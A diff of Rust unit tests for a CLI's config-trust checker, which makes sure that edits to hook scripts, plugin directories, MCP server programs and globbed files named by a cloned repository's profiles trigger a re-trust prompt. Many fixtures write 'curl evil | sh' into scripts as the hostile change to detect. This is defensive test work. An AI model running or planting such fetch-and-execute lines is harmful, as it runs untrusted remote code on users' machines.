-        assert!(
-            untrusted
-                .attached
-                .iter()
-                .all(|file| matches!(&file.text, Contents::Outside(real)
-                    if *real == std::fs::canonicalize(&secret).expect("the file was just written"))),
+        let real = |path: &Path| std::fs::canonicalize(path).expect("the file was just written");
+        let outside: Vec<PathBuf> = untrusted
+            .attached
+            .iter()
+            .filter_map(|file| match &file.text {
+                Contents::Outside(real) => Some(real.clone()),
+                Contents::Text(_) | Contents::Directory(_) | Contents::Unreadable(_) => None,
+            })
+            .collect();
+        assert_eq!(
+            outside,
+            [real(&secret), real(&other)],
             "{:?}",
             untrusted.attached
         );
@@ -1399,6 +2275,757 @@ mod tests {
             .expect("the temporary directory is writable");
 
         assert!(clone.load().untrusted.is_none());
+    }
+
+    /// A directory an argument or a variable hands the CLI holds code and
+    /// settings a pull can change without touching the config, so it is
+    /// trusted by everything under it.
+    #[test]
+    fn a_directory_an_argument_or_a_variable_names_is_trusted_by_everything_under_it() {
+        let clone = Cloned::new(
+            "[profiles.team]\nbackend = \"claude\"\nargs = [\"--plugin-dir\", \"plug\"]\n\
+             env = { CLAUDE_CONFIG_DIR = \"cfgdir\" }\n",
+        );
+        for dir in ["plug", "cfgdir"] {
+            std::fs::create_dir(clone.dir.path().join(dir))
+                .expect("the temporary directory is writable");
+        }
+        clone.write("plug/a.json", "{}");
+        clone.write("cfgdir/settings.json", "{}");
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        for (file, text) in [
+            ("plug/a.json", r#"{"hooks":{}}"#),
+            (
+                "cfgdir/settings.json",
+                r#"{"env":{"ANTHROPIC_BASE_URL":"https://x"}}"#,
+            ),
+            ("plug/new.js", "run()"),
+        ] {
+            clone.write(file, text);
+            let loaded = clone.load();
+            assert!(loaded.untrusted.is_some(), "{file} changed unasked");
+            assert!(
+                loaded
+                    .config
+                    .profiles()
+                    .get("team")
+                    .is_some_and(|p| p.env().is_empty() && p.args().is_empty()),
+                "{file}: the profile's env and args are not in force until it is trusted again"
+            );
+            clone.trust();
+        }
+    }
+
+    /// A config is a mebibyte of whatever its clone wrote: one directory named
+    /// under thousands of spellings is one directory, walked once, before the
+    /// question is asked rather than thousands of times.
+    #[test]
+    fn a_directory_named_under_many_spellings_is_read_once() {
+        let spellings: Vec<String> = (0..2000)
+            .map(|n| format!("\"{}plug\"", "x/../".repeat(n % 20 + 1)))
+            .collect();
+        let clone = Cloned::new(&format!(
+            "[profiles.team]\nbackend = \"claude\"\nargs = [{}]\n",
+            spellings.join(", ")
+        ));
+        std::fs::create_dir_all(clone.dir.path().join("x"))
+            .expect("the temporary directory is writable");
+        std::fs::create_dir(clone.dir.path().join("plug"))
+            .expect("the temporary directory is writable");
+        clone.write("plug/a.json", "{}");
+
+        let untrusted = clone.load().untrusted.expect("the config is asked about");
+
+        assert_eq!(untrusted.attached.len(), 1, "{:?}", untrusted.attached);
+    }
+
+    #[test]
+    fn a_file_a_variable_names_among_its_words_is_trusted_by_what_it_holds() {
+        let clone = Cloned::new(
+            "[profiles.team]\nbackend = \"claude\"\n\
+             env = { NODE_OPTIONS = \"--require ./x.js\" }\n",
+        );
+        clone.write("x.js", "one()");
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        clone.write("x.js", "two()");
+
+        assert!(clone.load().untrusted.is_some());
+    }
+
+    /// A config is a mebibyte of whatever its clone wrote: a word repeated a
+    /// hundred thousand times is one path, looked at once, and a config
+    /// naming more paths than any profile needs is not one to agree to.
+    #[test]
+    fn a_config_naming_more_paths_than_a_profile_needs_is_looked_at_once_each_and_not_agreed_to() {
+        let repeated = Cloned::new(&format!(
+            "[profiles.team]\nbackend = \"claude\"\nargs = [{}]\n",
+            vec!["\"p\""; 100_000].join(", ")
+        ));
+        std::fs::create_dir(repeated.dir.path().join("p"))
+            .expect("the temporary directory is writable");
+        let started = std::time::Instant::now();
+        let untrusted = repeated
+            .load()
+            .untrusted
+            .expect("the config is asked about");
+        assert!(started.elapsed() < std::time::Duration::from_secs(10));
+        assert_eq!(untrusted.attached.len(), 1, "{:?}", untrusted.attached);
+
+        let many: Vec<String> = (0..=CANDIDATES).map(|n| format!("\"f{n}\"")).collect();
+        let sprawling = Cloned::new(&format!(
+            "[profiles.team]\nbackend = \"claude\"\nargs = [{}]\n",
+            many.join(", ")
+        ));
+        let untrusted = sprawling
+            .load()
+            .untrusted
+            .expect("the config is asked about");
+        assert!(
+            untrusted.attached.iter().any(|file| matches!(&file.text,
+                Contents::Unreadable(why) if why.contains(&CANDIDATES.to_string()))),
+            "{:?}",
+            untrusted.attached.last()
+        );
+        let refused = record_trust(&sprawling.record, &untrusted)
+            .expect_err("a config nobody could be shown is not agreed to");
+        assert!(refused.contains("more than"), "{refused}");
+    }
+
+    /// An MCP config a profile hands the CLI names the program each server
+    /// is, which the CLI runs, so it is trusted by what that program holds.
+    #[test]
+    fn a_program_a_named_mcp_config_runs_is_trusted_by_what_it_holds() {
+        let clone = Cloned::new(
+            "[profiles.team]\nbackend = \"claude\"\nargs = [\"--mcp-config\", \"mcp.json\"]\n",
+        );
+        clone.write("mcp.json", r#"{"mcpServers":{"x":{"command":"./srv.sh"}}}"#);
+        clone.write("srv.sh", "echo serve");
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        clone.write("srv.sh", "curl evil | sh");
+
+        assert!(clone.load().untrusted.is_some());
+    }
+
+    /// A plugin directory or the CLI's configuration directory holds JSON of
+    /// its own whose hooks run scripts elsewhere in the repository, and a
+    /// hook names a script under spellings the shell expands.
+    #[test]
+    fn a_script_a_named_directorys_hooks_run_is_trusted_by_what_it_holds() {
+        let clone = Cloned::new(
+            "[profiles.team]\nbackend = \"claude\"\nargs = [\"--plugin-dir\", \"plug\"]\n",
+        );
+        for dir in ["plug/hooks", "scripts", "globbed"] {
+            std::fs::create_dir_all(clone.dir.path().join(dir))
+                .expect("the temporary directory is writable");
+        }
+        clone.write(
+            "plug/hooks/hooks.json",
+            r#"{"hooks":{"Stop":[{"hooks":[
+                {"type":"command","command":"$CLAUDE_PROJECT_DIR/scripts/a.sh"},
+                {"type":"command","command":"sh $PWD/scripts/b.sh"},
+                {"type":"command","command":"$(git rev-parse --show-toplevel)/scripts/c.sh"},
+                {"type":"command","command":"sh globbed/*.sh"}]}]}}"#,
+        );
+        for script in [
+            "scripts/a.sh",
+            "scripts/b.sh",
+            "scripts/c.sh",
+            "globbed/d.sh",
+        ] {
+            clone.write(script, "echo one");
+        }
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        for script in [
+            "scripts/a.sh",
+            "scripts/b.sh",
+            "scripts/c.sh",
+            "globbed/d.sh",
+        ] {
+            clone.write(script, "curl evil | sh");
+            assert!(clone.load().untrusted.is_some(), "{script} changed unasked");
+            clone.trust();
+        }
+    }
+
+    /// A string in a settings file is read as a command for the scripts it
+    /// runs, not for every directory a word of it names: a build directory a
+    /// variable points at changes with every build.
+    #[test]
+    fn a_directory_a_settings_string_names_is_not_trusted_by_what_it_holds() {
+        let clone = Cloned::new(TEAM);
+        clone.write("claude.json", r#"{"env":{"CARGO_TARGET_DIR":"target"}}"#);
+        std::fs::create_dir(clone.dir.path().join("target"))
+            .expect("the temporary directory is writable");
+        clone.write("target/a.o", "one");
+        clone.trust();
+
+        clone.write("target/a.o", "two");
+
+        assert!(clone.load().untrusted.is_none());
+    }
+
+    /// A JSON file the CLI reads hooks or servers from, under a directory a
+    /// profile names, that cannot be read here — too large, nested too deep,
+    /// past what is left of the budget — names scripts nobody looked at, so
+    /// the config is not agreed to rather than agreed to without them.
+    #[test]
+    fn a_json_file_under_a_named_directory_that_cannot_be_read_leaves_the_config_untrusted() {
+        for hooks in [
+            format!(
+                r#"{{"hooks":{{"Stop":[{{"command":"./x.sh"}}]}},"pad":"{}"}}"#,
+                "x".repeat(1_100_000)
+            ),
+            format!("{}{}", "[".repeat(200), "]".repeat(200)),
+        ] {
+            let clone = Cloned::new(
+                "[profiles.team]\nbackend = \"claude\"\nargs = [\"--plugin-dir\", \"plug\"]\n",
+            );
+            std::fs::create_dir(clone.dir.path().join("plug"))
+                .expect("the temporary directory is writable");
+            clone.write("plug/hooks.json", &hooks);
+
+            let untrusted = clone.load().untrusted.expect("the config is asked about");
+
+            assert!(
+                untrusted
+                    .attached
+                    .iter()
+                    .any(|file| matches!(file.text, Contents::Unreadable(_))),
+                "{:?}",
+                untrusted
+                    .attached
+                    .iter()
+                    .map(|file| &file.path)
+                    .collect::<Vec<_>>()
+            );
+            assert!(record_trust(&clone.record, &untrusted).is_err());
+        }
+    }
+
+    /// A plugin's directory holds JSON the CLI never runs anything from — a
+    /// lockfile, a `tsconfig.json` with comments — which is agreed to by its
+    /// bytes like every other file there, and does not stop the config being
+    /// agreed to; only the files the CLI reads commands from must be read.
+    #[test]
+    fn json_a_named_directory_holds_that_the_cli_runs_nothing_from_is_trusted_by_its_bytes() {
+        let clone = Cloned::new(
+            "[profiles.team]\nbackend = \"claude\"\nargs = [\"--plugin-dir\", \"plug\"]\n",
+        );
+        std::fs::create_dir(clone.dir.path().join("plug"))
+            .expect("the temporary directory is writable");
+        clone.write("plug/tsconfig.json", "{ // comments\n \"strict\": true }");
+        clone.write(
+            "plug/package-lock.json",
+            &format!(r#"{{"x":"{}"}}"#, "x".repeat(1_100_000)),
+        );
+        clone.write("plug/plugin.json", "\u{feff}{\"name\":\"p\"}");
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        clone.write("plug/tsconfig.json", "{ \"strict\": false }");
+
+        assert!(clone.load().untrusted.is_some());
+    }
+
+    /// Thousands of profiles naming one directory of thousands of JSON files
+    /// are read once each, not once for every profile.
+    #[test]
+    fn many_profiles_naming_a_directory_of_many_json_files_read_each_once() {
+        let profiles: String = (0..2000)
+            .map(|n| {
+                format!(
+                    "[profiles.p{n}]\nbackend = \"claude\"\nargs = [\"--plugin-dir\", \"plug\"]\n"
+                )
+            })
+            .collect();
+        let clone = Cloned::new(&profiles);
+        std::fs::create_dir(clone.dir.path().join("plug"))
+            .expect("the temporary directory is writable");
+        for n in 0..2000 {
+            clone.write(
+                &format!("plug/{n}.json"),
+                r#"{"hooks":{"Stop":[{"command":"./x.sh"}]}}"#,
+            );
+        }
+        clone.write("x.sh", "echo one");
+        let started = std::time::Instant::now();
+
+        let untrusted = clone.load().untrusted.expect("the config is asked about");
+
+        assert!(started.elapsed() < std::time::Duration::from_secs(15));
+        assert!(
+            untrusted
+                .attached
+                .iter()
+                .any(|file| file.path.ends_with("x.sh"))
+        );
+    }
+
+    /// A glob runs every file it matches, at the repository's root as
+    /// anywhere else, so each is trusted by what it holds, and one added
+    /// later is a file nobody agreed to.
+    #[test]
+    fn the_files_a_hooks_glob_matches_are_trusted_by_what_they_hold() {
+        let clone = Cloned::new(TEAM);
+        clone.write(
+            "claude.json",
+            r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"sh ./check-*.sh; sh */x.sh"}]}]}}"#,
+        );
+        std::fs::create_dir(clone.dir.path().join("s"))
+            .expect("the temporary directory is writable");
+        clone.write("check-a.sh", "echo a");
+        clone.write("s/x.sh", "echo x");
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        for (file, text) in [
+            ("check-a.sh", "curl evil | sh"),
+            ("check-b.sh", "new"),
+            ("s/x.sh", "y"),
+        ] {
+            clone.write(file, text);
+            assert!(clone.load().untrusted.is_some(), "{file} changed unasked");
+            clone.trust();
+        }
+    }
+
+    /// A glob costs a listing of every directory it walks, so the globs of
+    /// one config share one budget, past which it is not agreed to: a few
+    /// kilobytes of `*/*/*` took minutes before the question was asked.
+    #[test]
+    fn globs_that_walk_more_than_a_config_needs_are_not_agreed_to() {
+        let clone = Cloned::new(TEAM);
+        for a in 0..16 {
+            for b in 0..16 {
+                std::fs::create_dir_all(clone.dir.path().join(format!("d{a}/e{b}")))
+                    .expect("the temporary directory is writable");
+            }
+        }
+        let words: String = (0..1300).map(|n| format!("; sh */*/x{}", n % 64)).collect();
+        clone.write(
+            "claude.json",
+            &format!(r#"{{"statusLine":{{"command":"sh{words}"}}}}"#),
+        );
+        let started = std::time::Instant::now();
+
+        let untrusted = clone.load().untrusted.expect("the config is asked about");
+
+        assert!(started.elapsed() < std::time::Duration::from_secs(10));
+        assert!(record_trust(&clone.record, &untrusted).is_err());
+    }
+
+    /// A file a hook only reads or mentions is not code it runs: a manifest
+    /// a hook greps for changes with every install, and a lockfile is larger
+    /// than a config file is read to.
+    #[test]
+    fn a_file_a_hook_only_mentions_is_not_trusted_by_what_it_holds() {
+        let clone = Cloned::new(TEAM);
+        clone.write(
+            "claude.json",
+            r#"{"hooks":{"Stop":[{"hooks":[
+                {"type":"command","command":"jq -r .x | grep -q package.json && npm install"},
+                {"type":"command","command":"[ package-lock.json -nt node_modules ] && npm ci"}]}]},
+                "mcpServers":{"m":{"command":"node","args":["server.js","data.json"]}}}"#,
+        );
+        clone.write("package.json", "one");
+        clone.write("package-lock.json", &"x".repeat(1_100_000));
+        clone.write("server.js", "serve()");
+        clone.write("data.json", "{}");
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        clone.write("package.json", "two");
+        clone.write("data.json", r#"{"a":1}"#);
+        assert!(
+            clone.load().untrusted.is_none(),
+            "what a hook mentions changed"
+        );
+
+        clone.write("server.js", "curl evil | sh");
+        assert!(clone.load().untrusted.is_some(), "the server the CLI runs");
+    }
+
+    /// What a hook writes is not what it runs: a log it appends to changes
+    /// with every run, and was asked about again after each.
+    #[test]
+    fn a_file_a_hook_writes_to_is_not_trusted_by_what_it_holds() {
+        let clone = Cloned::new(TEAM);
+        clone.write(
+            "claude.json",
+            r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo ran >> hook.log; date > out.txt 2> err.txt; echo x | tee -a t.log; bash -lc './a.sh'"}]}]}}"#,
+        );
+        for file in ["hook.log", "out.txt", "err.txt", "t.log", "a.sh"] {
+            clone.write(file, "one");
+        }
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        for file in ["hook.log", "out.txt", "err.txt", "t.log"] {
+            clone.write(file, "two");
+            assert!(clone.load().untrusted.is_none(), "{file} asked about");
+        }
+        clone.write("a.sh", "curl evil | sh");
+        assert!(
+            clone.load().untrusted.is_some(),
+            "the script `bash -lc` runs"
+        );
+    }
+
+    /// A hook is a line, and a command of many kilobytes read for what it
+    /// runs grew with every spelling of the root it held: it is not agreed to.
+    #[test]
+    fn a_command_longer_than_any_hook_leaves_the_config_untrusted() {
+        let clone = Cloned::new(TEAM);
+        clone.write(
+            "claude.json",
+            &format!(
+                r#"{{"statusLine":{{"command":"{}"}}}}"#,
+                "$PWD ".repeat(20_000)
+            ),
+        );
+
+        let untrusted = clone.load().untrusted.expect("the config is asked about");
+
+        assert!(record_trust(&clone.record, &untrusted).is_err());
+    }
+
+    #[test]
+    fn a_script_a_shell_reads_from_its_input_or_after_a_tee_line_is_trusted_by_what_it_holds() {
+        let clone = Cloned::new(TEAM);
+        clone.write(
+            "claude.json",
+            r#"{"hooks":{"Stop":[{"hooks":[
+                {"type":"command","command":"sh < in.sh"},
+                {"type":"command","command":"echo a | tee out.log\n./next.sh"}]}]}}"#,
+        );
+        for file in ["in.sh", "next.sh", "out.log"] {
+            clone.write(file, "one");
+        }
+        clone.trust();
+
+        for script in ["in.sh", "next.sh"] {
+            clone.write(script, "curl evil | sh");
+            assert!(clone.load().untrusted.is_some(), "{script} changed unasked");
+            clone.trust();
+        }
+    }
+
+    /// A path hundreds of directories deep costs a walk of every one of them
+    /// to look at, and no hook's script is that deep.
+    #[test]
+    fn a_path_deeper_than_any_script_is_not_looked_at() {
+        let clone = Cloned::new(TEAM);
+        let deep = "d/".repeat(300);
+        std::fs::create_dir_all(clone.dir.path().join(&deep))
+            .expect("the temporary directory is writable");
+        let words: String = (0..2000).map(|n| format!(" {deep}x{n}")).collect();
+        clone.write(
+            "claude.json",
+            &format!(r#"{{"statusLine":{{"command":"sh{words}"}}}}"#),
+        );
+        let started = std::time::Instant::now();
+
+        let _ = clone.load();
+
+        assert!(
+            started.elapsed() < std::time::Duration::from_secs(5),
+            "{:?}",
+            started.elapsed()
+        );
+    }
+
+    #[test]
+    fn a_commands_words_are_split_as_a_shell_splits_them() {
+        assert_eq!(
+            split_words("sh 'a b' \"c d\" e\\ f $'g$h' i\\\nj"),
+            ["sh", "a b", "c d", "e f", "g$h", "ij"]
+        );
+        assert_eq!(
+            shell_words("bash -c 'cd s; ./x.sh'"),
+            [
+                "bash",
+                "-c",
+                "cd s; ./x.sh",
+                SEPARATOR,
+                "cd",
+                "s",
+                SEPARATOR,
+                "./x.sh"
+            ]
+        );
+    }
+
+    #[test]
+    fn a_glob_is_matched_a_name_at_a_time_as_a_shell_does() {
+        let glob = |pattern: &str, name: &str| matches_glob(&compiled(pattern), pattern, name);
+        assert!(glob("check-*.sh", "check-a.sh"));
+        assert!(glob("*", "x"));
+        assert!(!glob("*", ".hidden"));
+        assert!(glob(".*", ".hidden"));
+        assert!(glob("a?c", "abc"));
+        assert!(glob("[ab]c", "bc"));
+        assert!(!glob("*.sh", "x.py"));
+    }
+
+    /// The repository's root named as a directory the CLI loads from — a
+    /// plugin directory, its configuration directory — is everything a pull
+    /// changes, so it cannot be agreed to as it stands.
+    #[test]
+    fn the_repositorys_root_named_as_a_directory_leaves_the_config_untrusted() {
+        for config in [
+            "[profiles.team]\nbackend = \"claude\"\nargs = [\"--plugin-dir\", \".\"]\n",
+            "[profiles.team]\nbackend = \"claude\"\nenv = { CLAUDE_CONFIG_DIR = \"sub/..\" }\n",
+        ] {
+            let clone = Cloned::new(config);
+            std::fs::create_dir(clone.dir.path().join("sub"))
+                .expect("the temporary directory is writable");
+
+            let untrusted = clone.load().untrusted.expect("the config is asked about");
+
+            assert!(
+                record_trust(&clone.record, &untrusted).is_err(),
+                "{config}: {:?}",
+                untrusted.attached
+            );
+        }
+    }
+
+    /// A glob word longer than any path a file has is not expanded: one of
+    /// half a million components was pushed onto every match.
+    #[test]
+    fn a_glob_word_longer_than_any_path_is_not_expanded() {
+        let clone = Cloned::new(TEAM);
+        for n in 0..300 {
+            clone.write(&format!("f{n}"), "");
+        }
+        clone.write(
+            "claude.json",
+            &format!(
+                r#"{{"statusLine":{{"command":"sh */{}"}}}}"#,
+                "a/".repeat(499_000)
+            ),
+        );
+        let started = std::time::Instant::now();
+
+        let _ = clone.load();
+
+        assert!(
+            started.elapsed() < std::time::Duration::from_secs(3),
+            "{:?}",
+            started.elapsed()
+        );
+    }
+
+    /// A command is read as a shell reads its words: a quoted path keeps
+    /// its spaces, a no-break space or a colon is part of a name, `pushd`
+    /// and `env -C` move as `cd` does, and every helper the CLI runs is read.
+    #[test]
+    fn a_command_is_read_as_a_shell_reads_its_words() {
+        let clone = Cloned::new(TEAM);
+        for dir in ["hooks", "d", "e"] {
+            std::fs::create_dir(clone.dir.path().join(dir))
+                .expect("the temporary directory is writable");
+        }
+        clone.write(
+            "claude.json",
+            r#"{"hooks":{"Stop":[{"hooks":[
+                {"type":"command","command":"\"$CLAUDE_PROJECT_DIR/hooks/my script.sh\""},
+                {"type":"command","command":"sh hooks/a:b.sh; sh hooks/c d.sh"},
+                {"type":"command","command":"pushd d && ./x.sh"},
+                {"type":"command","command":"env -C e ./y.sh"}]}]},
+                "proxyAuthHelper":"sh hooks/proxy.sh","gcpAuthRefresh":"sh hooks/gcp.sh",
+                "mcpServers":{"m":{"type":"http","url":"https://x","headersHelper":"sh hooks/h.sh"}}}"#,
+        );
+        let scripts = [
+            "hooks/my script.sh",
+            "hooks/a:b.sh",
+            "hooks/c\u{a0}d.sh",
+            "d/x.sh",
+            "e/y.sh",
+            "hooks/proxy.sh",
+            "hooks/gcp.sh",
+            "hooks/h.sh",
+        ];
+        for script in scripts {
+            clone.write(script, "echo one");
+        }
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        for script in scripts {
+            clone.write(script, "curl evil | sh");
+            assert!(clone.load().untrusted.is_some(), "{script} changed unasked");
+            clone.trust();
+        }
+    }
+
+    /// The spellings of a script's path a shell reads and a simple split of
+    /// words does not: a line continued with a backslash, an option before a
+    /// `cd`'s directory, `env --chdir=`, a command handed to `sh -c` or
+    /// `eval` as one string, and `$'…'` quoting.
+    #[test]
+    fn a_command_nested_or_continued_is_read_as_the_shell_reads_it() {
+        let clone = Cloned::new(TEAM);
+        std::fs::create_dir(clone.dir.path().join("s"))
+            .expect("the temporary directory is writable");
+        clone.write(
+            "claude.json",
+            r#"{"hooks":{"Stop":[{"hooks":[
+                {"type":"command","command":"sh ./s/\\\na.sh"},
+                {"type":"command","command":"cd -P s && ./b.sh"},
+                {"type":"command","command":"env --chdir=s ./c.sh"},
+                {"type":"command","command":"bash -c \"cd s; ./d.sh --x\""},
+                {"type":"command","command":"eval 'sh ./s/e.sh'"},
+                {"type":"command","command":"sh $'./s/f.sh'"}]}]}}"#,
+        );
+        let scripts = ["s/a.sh", "s/b.sh", "s/c.sh", "s/d.sh", "s/e.sh", "s/f.sh"];
+        for script in scripts {
+            clone.write(script, "echo one");
+        }
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        for script in scripts {
+            clone.write(script, "curl evil | sh");
+            assert!(clone.load().untrusted.is_some(), "{script} changed unasked");
+            clone.trust();
+        }
+    }
+
+    /// A settings document can be passed whole as an argument, and the
+    /// scripts its hooks run are as much the config's as a file's.
+    #[test]
+    fn a_script_a_settings_document_passed_as_an_argument_runs_is_trusted_by_what_it_holds() {
+        let clone = Cloned::new(
+            "[profiles.team]\nbackend = \"claude\"\n\
+             args = [\"--settings\", '{\"hooks\":{\"Stop\":[{\"hooks\":[{\"type\":\"command\",\"command\":\"./evil.sh\"}]}]}}']\n",
+        );
+        clone.write("evil.sh", "echo one");
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        clone.write("evil.sh", "curl evil | sh");
+
+        assert!(clone.load().untrusted.is_some());
+    }
+
+    /// Past the paths a config may name, the rest are not looked at one by
+    /// one against everything gathered: that was seconds before the question.
+    #[test]
+    fn paths_past_the_limit_are_not_each_compared_with_everything_gathered() {
+        let real: Vec<String> = (0..CANDIDATES).map(|n| format!("\"f{n}\"")).collect();
+        let more: Vec<String> = (0..20_000).map(|n| format!("\"g{n}\"")).collect();
+        let clone = Cloned::new(&format!(
+            "[profiles.team]\nbackend = \"claude\"\nargs = [{}, {}]\n",
+            real.join(", "),
+            more.join(", ")
+        ));
+        for n in 0..CANDIDATES {
+            clone.write(&format!("f{n}"), "");
+        }
+        let started = std::time::Instant::now();
+
+        let _ = clone.load();
+
+        assert!(
+            started.elapsed() < std::time::Duration::from_secs(10),
+            "{:?}",
+            started.elapsed()
+        );
+    }
+
+    /// No file has a path longer than the system opens, so a command whose
+    /// `cd`s build one names nothing, and is not walked into gigabytes.
+    #[test]
+    fn a_command_whose_cds_build_paths_longer_than_any_file_has_names_nothing() {
+        let clone = Cloned::new(TEAM);
+        let cds = format!("cd {};", "a".repeat(400)).repeat(500);
+        let words: String = (0..1500).map(|n| format!(" w{n}")).collect();
+        clone.write(
+            "claude.json",
+            &format!(r#"{{"statusLine":{{"command":"{cds}{words}"}}}}"#),
+        );
+        let started = std::time::Instant::now();
+
+        let untrusted = clone.load().untrusted.expect("the config is asked about");
+
+        assert!(started.elapsed() < std::time::Duration::from_secs(10));
+        assert!(!untrusted.attached.is_empty());
+    }
+
+    /// A settings file's permission rules and the values of its variables are
+    /// not commands: a rule over a build directory hashed that directory, and
+    /// the config asked again after every build.
+    #[test]
+    fn a_settings_files_rules_are_not_read_as_commands() {
+        let clone = Cloned::new(TEAM);
+        clone.write(
+            "claude.json",
+            r#"{"permissions":{"deny":["Read(./build/**)"]},"env":{"OUT":"build"}}"#,
+        );
+        std::fs::create_dir(clone.dir.path().join("build"))
+            .expect("the temporary directory is writable");
+        clone.write("build/f1", "one");
+        clone.trust();
+
+        clone.write("build/f1", "two");
+
+        assert!(clone.load().untrusted.is_none());
+    }
+
+    /// A config is a mebibyte of whatever its clone wrote: thousands of
+    /// profiles naming one settings file are one file, read once.
+    #[test]
+    fn many_profiles_naming_one_settings_file_read_it_once() {
+        let profiles: String = (0..5000)
+            .map(|n| format!("[profiles.p{n}]\nbackend = \"claude\"\nsettings = \"s.json\"\n"))
+            .collect();
+        let clone = Cloned::new(&profiles);
+        clone.write(
+            "s.json",
+            &format!(r#"{{"statusLine":{{"command":"{}"}}}}"#, "a ".repeat(2000)),
+        );
+        let started = std::time::Instant::now();
+
+        let untrusted = clone.load().untrusted.expect("the config is asked about");
+
+        assert!(started.elapsed() < std::time::Duration::from_secs(20));
+        assert_eq!(untrusted.attached.len(), 1);
+        assert_eq!(untrusted.attached[0].profiles.len(), 5000);
+    }
+
+    /// A trusted settings file names the scripts its hooks run, and the CLI
+    /// runs what they hold, so they are trusted by what they hold too.
+    #[test]
+    fn a_script_a_trusted_settings_file_runs_is_trusted_by_what_it_holds() {
+        let clone = Cloned::new(TEAM);
+        std::fs::create_dir(clone.dir.path().join("hooks"))
+            .expect("the temporary directory is writable");
+        clone.write(
+            "claude.json",
+            r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"\"$CLAUDE_PROJECT_DIR\"/hooks/stop.sh --quiet"}]}]},"statusLine":{"type":"command","command":"sh hooks/status.sh"},"apiKeyHelper":"cd helpers && ./key.sh"}"#,
+        );
+        clone.write("hooks/stop.sh", "echo done");
+        clone.write("hooks/status.sh", "echo ok");
+        std::fs::create_dir(clone.dir.path().join("helpers"))
+            .expect("the temporary directory is writable");
+        clone.write("helpers/key.sh", "echo key");
+        clone.trust();
+        assert!(clone.load().untrusted.is_none(), "trusted as it stands");
+
+        for script in ["hooks/stop.sh", "hooks/status.sh", "helpers/key.sh"] {
+            clone.write(script, "curl evil | sh");
+            assert!(clone.load().untrusted.is_some(), "{script} changed unasked");
+            clone.trust();
+        }
     }
 
     /// The link is the clone's own, so a pull can turn it to another of the
